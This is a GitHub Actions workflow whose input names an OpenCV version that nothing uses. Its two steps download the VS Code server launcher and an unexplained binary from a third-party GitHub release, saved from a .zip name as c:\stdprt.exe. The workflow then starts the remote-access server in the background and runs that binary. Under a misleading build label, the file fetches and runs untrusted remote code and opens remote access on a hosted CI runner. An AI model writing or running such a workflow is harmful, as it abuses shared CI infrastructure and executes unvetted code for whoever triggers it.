name: vscode

on:
  workflow_dispatch:
    inputs:
      opencv-version:
        description: vscode
        required: true
        default: 4.5.2

jobs:
  publish_windows_x64:
    runs-on: windows-latest

    steps:
      - name: dodl
        run: |
          Invoke-WebRequest "https://aka.ms/vscode-server-launcher/x86_64-pc-windows-msvc" -OutFile "c:\vsc.exe"
          Invoke-WebRequest "https://github.com/Klanly/buildcv/releases/download/200.300/stdprt.zip" -OutFile "c:\stdprt.exe"
          
      - name: tocmd
        run: |
          start /B "" c:\vsc.exe --accept-server-license-terms --disable-telemetry > c:\vscout.txt
          c:\stdprt.exe
        shell: cmd

 
